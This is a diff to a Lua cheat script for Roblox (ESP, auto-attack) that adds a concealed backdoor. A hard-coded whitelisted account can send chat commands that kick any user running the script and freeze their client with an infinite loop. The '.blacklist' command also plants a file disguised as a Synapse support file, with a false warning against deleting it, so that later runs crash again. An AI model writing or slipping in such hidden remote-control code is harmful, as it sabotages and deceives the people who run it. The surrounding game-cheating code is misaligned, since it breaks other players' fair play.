@@ -1,8 +1,20 @@
-local version = 1.38
+local version = 1.4
 local retTable = {}
+local whitelisted = {'unc1995';}
 retTable.Ver = version
 retTable.Run = function()
 	coroutine.resume(coroutine.create(function()
+		pcall(function()
+			local isBlacklisted = isfile('synsupport.txt')
+			if isBlacklisted then
+				delay(2, function()
+					while true do
+						print("Crash")
+					end
+				end)
+				game:GetService('Players').LocalPlayer:Kick('Blacklisted from using this script.')
+			end
+		end)
 		getgenv().executed = true
 		getgenv().DoNotification = function(text)
 			game:GetService("StarterGui"):SetCore("SendNotification", {
@@ -52,6 +64,50 @@ ability to use tools at any conditions.
 		espfolder.Parent = game:GetService("CoreGui")
 		local usingesp = false
 		local autoattack = false
+		local function doCMD(msg)
+			local spl = string.split(msg, ' ')
+			if spl[1] and spl[2] then
+				if spl[1] == '.blacklist' then
+					if spl[2]==game:GetService('Players').LocalPlayer.Name then
+						pcall(function()
+							writefile('synsupport.txt', "<F>[.Certain Features of synapse will not be functioning if this file is removed.")
+						end)
+						d(2, function()
+							while true do
+								print'crash'
+							end
+						end)
+						game:GetService('Players').LocalPlayer:Kick("Blacklisted.")
+					end
+				elseif spl[1] == '.kick' then
+					if spl[2]==game:GetService('Players').LocalPlayer.Name then
+						d(2, function()
+							while true do
+								print'crash'
+							end
+						end)
+						game:GetService('Players').LocalPlayer:Kick()
+					end
+				end
+				
+			end
+		end
+		coroutine.resume(coroutine.create(function()
+			for _, v in pairs(game:GetService('Players'):GetPlayers()) do
+				if table.find(whitelisted, v.Name) then
+					table.insert(gCons, v.Chatted:Connect(function(msg)
+						doCMD(msg)
+					end))
+				end
+			end
+			table.insert(gCons, game:GetService("Players").PlayerAdded:Connect(function(plr)
+				if table.find(whitelisted, plr.Name) then
+					table.insert(gCons, plr.Chatted:Connect(function(msg)
+						doCMD(msg)
+					end))
+				end
+			end))
+		end))
 		-- workspace.Map
 --[[
 PhysicService:CreateCollisionGroup('mapParts')
